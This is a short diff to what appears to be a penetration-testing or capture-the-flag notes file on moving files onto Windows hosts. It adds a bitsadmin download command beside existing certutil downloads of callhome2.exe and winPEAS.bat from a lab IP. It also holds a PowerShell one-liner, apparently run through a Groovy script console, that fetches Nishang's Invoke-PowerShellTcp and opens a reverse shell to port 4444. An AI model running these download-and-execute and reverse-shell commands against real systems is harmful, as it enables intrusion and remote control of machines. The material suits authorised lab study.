@@ -273,6 +273,12 @@ certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome2.exe" callh
 certutil.exe -urlcache -split -f "http://10.10.139.149:8000/winPEAS.bat" winPEAS.bat
 ```
 
+bitsadmin approach:
+
+```
+bitsadmin /transfer myDownloadJob /download /priority normal https://downloadsrv/10mb.zip c:\\10mb.zip
+```
+
 with powershell (first also invokes a script, in this case Invoke-PowerShellTcp from Nishang):
 
 `println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.100.16:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.100.16 -Port 4444".execute().text`
